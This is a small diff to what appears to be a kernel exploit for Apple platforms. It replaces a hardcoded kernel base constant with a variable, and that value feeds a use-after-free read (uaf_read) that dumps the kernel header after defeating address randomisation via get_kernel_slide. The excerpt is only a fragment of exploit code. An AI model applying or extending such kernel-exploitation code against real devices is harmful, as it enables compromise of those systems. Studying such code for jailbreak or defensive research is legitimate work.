@@ -8,7 +8,7 @@
 
 #include "common.h"             // ASSERT, DEBUG, PRINT_BUF, TIMER_*, MIN, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
 #include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, vtab_t, dict_get_bytes
-#include "offsets.h"            // off_vtab, use_new_payload
+#include "offsets.h"            // off_vtab, use_new_payload, kernel_base
 #include "slide.h"              // get_kernel_slide
 #include "try.h"                // THROW, TRY, RETHROW, FINALLY
 
@@ -453,7 +453,7 @@ void uaf_dump_kernel(file_t *file)
     ({
         memset(newhbuf, 0, MIG_MSG_SIZE);
 
-        char *kbase = (char*)(KERNEL_BASE + get_kernel_slide());
+        char *kbase = (char*)(kernel_base + get_kernel_slide());
         uaf_read(kbase, hbuf, MIG_MSG_SIZE);
 
         mach_hdr_t *hdr = (mach_hdr_t*)hbuf;
